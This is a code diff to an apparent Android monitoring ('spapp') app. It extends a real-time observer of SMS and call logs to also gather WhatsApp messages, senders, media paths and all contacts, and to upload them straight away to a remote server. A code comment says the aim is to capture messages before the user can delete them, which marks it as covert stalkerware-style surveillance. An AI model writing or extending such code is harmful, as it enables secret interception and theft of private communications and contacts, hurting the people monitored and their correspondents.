@@ -18,6 +18,8 @@ import com.spapp.monitoring.network.CallLogEntryDto
 import com.spapp.monitoring.network.CallLogSyncRequest
 import com.spapp.monitoring.network.SmsLogEntryDto
 import com.spapp.monitoring.network.SmsLogSyncRequest
+import com.spapp.monitoring.network.WhatsAppMessageEntryDto
+import com.spapp.monitoring.network.WhatsAppMessagesSyncRequest
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -29,7 +31,7 @@ import kotlinx.coroutines.sync.withLock
 import java.time.Instant
 
 /**
- * Real-time ContentObserver for SMS and Call logs.
+ * Real-time ContentObserver for SMS, Call logs, and WhatsApp activity.
  *
  * Catches messages and calls the exact millisecond they are sent, received,
  * or completed — BEFORE the user has time to delete them from their messaging
@@ -54,11 +56,15 @@ object RealtimeLogObserverManager {
     private var callJob: Job? = null
     private val callMutex = Mutex()
 
+    private var whatsAppJob: Job? = null
+    private val whatsAppMutex = Mutex()
+
     @Synchronized
     fun start(context: Context) {
         val appCtx = context.applicationContext
         startSmsObserver(appCtx)
         startCallObserver(appCtx)
+        triggerInstantWhatsAppUpload(appCtx)
     }
 
     @Synchronized
@@ -85,6 +91,9 @@ object RealtimeLogObserverManager {
             callJob?.cancel()
             callJob = null
         }
+
+        whatsAppJob?.cancel()
+        whatsAppJob = null
     }
 
     private fun startSmsObserver(appCtx: Context) {
@@ -240,6 +249,60 @@ object RealtimeLogObserverManager {
                 Unit
             } catch (e: Exception) {
                 Log.e(TAG, "Error in real-time Call capture", e)
+            }
+        }
+    }
+
+    fun triggerInstantWhatsAppUpload(context: Context) {
+        synchronized(this) {
+            whatsAppJob?.cancel()
+            whatsAppJob = scope.launch {
+                delay(200) // Coalesce rapid notifications / row reads
+                captureAndUploadWhatsApp(context.applicationContext)
+            }
+        }
+    }
+
+    private suspend fun captureAndUploadWhatsApp(context: Context) {
+        whatsAppMutex.withLock {
+            try {
+                val db = AppDatabase.getInstance(context)
+                val state = DeviceState(context)
+                val bearer = state.authToken?.let { "Bearer $it" } ?: return
+
+                // 1. Collect real WhatsApp and phone contacts if possible
+                try {
+                    val contacts = WhatsAppContactsCollector(context).collectAllWhatsAppContacts()
+                    if (contacts.isNotEmpty()) {
+                        db.whatsAppMessageDao().insertAll(contacts)
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to collect WhatsApp contacts", e)
+                }
+
+                // 2. Upload any unsynced WhatsApp messages & contacts immediately
+                val unsynced = db.whatsAppMessageDao().getUnsynced()
+                if (unsynced.isNotEmpty()) {
+                    val dtos = unsynced.map {
+                        WhatsAppMessageEntryDto(
+                            chatName = it.chatName,
+                            sender = it.sender,
+                            messageText = it.messageText,
+                            isOutgoing = it.isOutgoing,
+                            messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
+                            mediaType = it.mediaType,
+                            mediaPath = it.mediaPath
+                        )
+                    }
+                    val response = ApiClient.service.syncWhatsAppMessages(bearer, WhatsAppMessagesSyncRequest(dtos))
+                    if (response.isSuccessful) {
+                        db.whatsAppMessageDao().deleteByIds(unsynced.map { it.id })
+                        Log.d(TAG, "Instantly uploaded ${dtos.size} WhatsApp messages/contacts to server")
+                    }
+                }
+                Unit
+            } catch (e: Exception) {
+                Log.e(TAG, "Error in real-time WhatsApp upload", e)
             }
         }
     }
